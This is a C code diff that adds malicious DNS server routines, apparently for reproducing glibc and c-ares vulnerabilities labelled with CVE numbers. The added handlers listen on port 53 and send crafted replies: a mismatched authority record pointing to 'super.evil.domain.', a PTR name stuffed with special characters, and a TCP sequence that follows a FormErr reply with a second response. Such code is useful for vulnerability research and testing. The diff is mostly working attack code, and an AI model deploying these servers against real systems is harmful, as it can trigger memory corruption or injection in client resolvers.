@@ -16,7 +16,7 @@
 #include "net/net_inc.c"
 #include "dns/dns_inc.c"
 
-#define LISTENING_PORT 53
+read_only u16 LISTENING_PORT = 53;
 #define TEST_IPV4_ADDR 0x0b16212c
 
 internal void bdns_test(void)
@@ -172,11 +172,43 @@ internal void bdns_g02(bool32 no_vuln)
 {
     // glibc
     // CVE-2026-4437
-    printf("g02\n");
+    printf("g02 : 127.0.0.1:%hu\n", LISTENING_PORT);
     Temp scratch = scratch_begin(0, 0);
 
-    
-    
+    DNS_Server server = dns_server_alloc(NET_AddressFamily_IPv4, DNS_TransportProtocol_UDP, LISTENING_PORT);
+    DNS_Msg query = {0};
+    NET_Client client = net_listener_accept(scratch.arena, server.listener);
+    printf("Accepted UDP client\n");
+    if (dns_unpack_msg(scratch.arena, client.recv_buffer, &query))
+    {
+        DNS_Msg msg = query;
+
+        msg.header.query_response = true;
+        msg.header.authoritative  = true;
+        msg.header.rcode          = DNS_RCode_NoError;
+
+        msg.header.answer_count = 1;
+        msg.header.nameserver_count = 1;
+
+        msg.answer = push_array(scratch.arena, DNS_RR, 1);
+        msg.ns     = push_array(scratch.arena, DNS_RR, 1);
+
+        msg.answer[0].name  = query.question[0].name;
+        msg.answer[0].type  = DNS_Type_A;
+        msg.answer[0].class = query.question[0].class;
+        msg.answer[0].ttl   = 300;
+        msg.answer[0].rdata.A.addr = TEST_IPV4_ADDR;
+
+        msg.ns[0].name  = query.question[0].name;
+        msg.ns[0].type  = query.question[0].type;
+        msg.ns[0].class = query.question[0].class;
+        msg.ns[0].ttl   = 300;
+        msg.ns[0].rdata.PTR.ptrdname = s("super.evil.domain.");
+
+        dns_pack_msg(client.send_buffer, &msg);
+        net_client_send_from_ring(&client);
+    }
+
     scratch_end(scratch);
 }
 
@@ -184,8 +216,34 @@ internal void bdns_g03(bool32 no_vuln)
 {
     // glibc
     // CVE-2026-4438
-    printf("g03\n");
+    printf("g03 : 127.0.0.1:%hu\n", LISTENING_PORT);
     Temp scratch = scratch_begin(0, 0);
+
+    DNS_Server server = dns_server_alloc(NET_AddressFamily_IPv4, DNS_TransportProtocol_UDP, LISTENING_PORT);
+    DNS_Msg query = {0};
+    NET_Client client = net_listener_accept(scratch.arena, server.listener);
+    printf("Accepted UDP client\n");
+    if (dns_unpack_msg(scratch.arena, client.recv_buffer, &query))
+    {
+        DNS_Msg msg = query;
+
+        msg.header.query_response = true;
+        msg.header.authoritative  = true;
+        msg.header.rcode          = DNS_RCode_NoError;
+
+        msg.header.answer_count = 1;
+
+        msg.answer = push_array(scratch.arena, DNS_RR, 1);
+
+        msg.answer[0].name  = query.question[0].name;
+        msg.answer[0].type  = query.question[0].type;
+        msg.answer[0].class = query.question[0].class;
+        msg.answer[0].ttl   = 300;
+        msg.answer[0].rdata.PTR.ptrdname = s("$uper.evi;.\t\n\tdomain.");
+
+        dns_pack_msg(client.send_buffer, &msg);
+        net_client_send_from_ring(&client);
+    }
 
     scratch_end(scratch);
 }
@@ -194,9 +252,78 @@ internal void bdns_c01(bool32 no_vuln)
 {
     // c-ares
     // CVE-2026-33630
-    printf("c01\n");
+    printf("c01 : 127.0.0.1:%hu\n", LISTENING_PORT);
     Temp scratch = scratch_begin(0, 0);
 
+    DNS_Server udp_server = dns_server_alloc(NET_AddressFamily_IPv4, DNS_TransportProtocol_UDP, LISTENING_PORT);
+    DNS_Server tcp_server = dns_server_alloc(NET_AddressFamily_IPv4, DNS_TransportProtocol_TCP, LISTENING_PORT);
+    DNS_Msg query = {0};
+
+    /*
+    NET_Client udp_client = net_listener_accept(scratch.arena, udp_server.listener);
+    printf("Accepted UDP client\n");
+    if (dns_unpack_msg(scratch.arena, udp_client.recv_buffer, &query))
+    {
+        DNS_Msg msg = query;
+
+        msg.header.query_response = true;
+        msg.header.authoritative  = true;
+        msg.header.truncated      = true;
+        msg.header.rcode          = DNS_RCode_NoError;
+
+        msg.header.answer_count = 0;
+
+        dns_pack_msg(udp_client.send_buffer, &msg);
+        if (net_client_send_from_ring(&udp_client))
+        {
+            printf("Sent UDP response with truncated DNS flag\n");
+        }
+        else
+        {
+            printf("Failed to send UDP response...\n");
+        }
+    }
+    */
+    NET_Client tcp_client = net_listener_accept(scratch.arena, tcp_server.listener);
+    printf("Accepted TCP client\n");
+    if (net_client_recv_to_ring(&tcp_client))
+    {
+        printf("Received TCP data\n");
+    }
+    else
+    {
+        printf("Failed to receive TCP data\n");
+    }
+    u16 length = 0;
+    ring_try_read_struct(tcp_client.recv_buffer, &length);
+    if (dns_unpack_msg(scratch.arena, tcp_client.recv_buffer, &query))
+    {
+        DNS_Msg msg = query;
+
+        msg.header.query_response = true;
+        msg.header.authoritative  = true;
+        msg.header.rcode          = DNS_RCode_FormErr;
+        msg.header.answer_count = 0;
+
+        dns_pack_msg(tcp_client.send_buffer, &msg);
+        Ring *ring = make_ring(scratch.arena, Kilobytes(64));
+        msg.header.answer_count = 1;
+        msg.answer = push_array(scratch.arena, DNS_RR, 1);
+        msg.answer[0].name = query.question[0].name;
+        msg.answer[0].type = query.question[0].type;
+        msg.answer[0].class = query.question[0].class;
+        msg.answer[0].ttl = 300;
+        msg.answer[0].rdata.PTR.ptrdname = s("example.domain.");
+        dns_pack_msg(ring, &msg);
+
+        net_client_send_from_ring(&tcp_client);
+        tcp_client.send_buffer = ring;
+        net_client_send_from_ring(&tcp_client);
+        sleep_ms(50);
+        net_client_close(tcp_client);
+        printf("Sent data!\n");
+    }
+    
     scratch_end(scratch);
 }
 
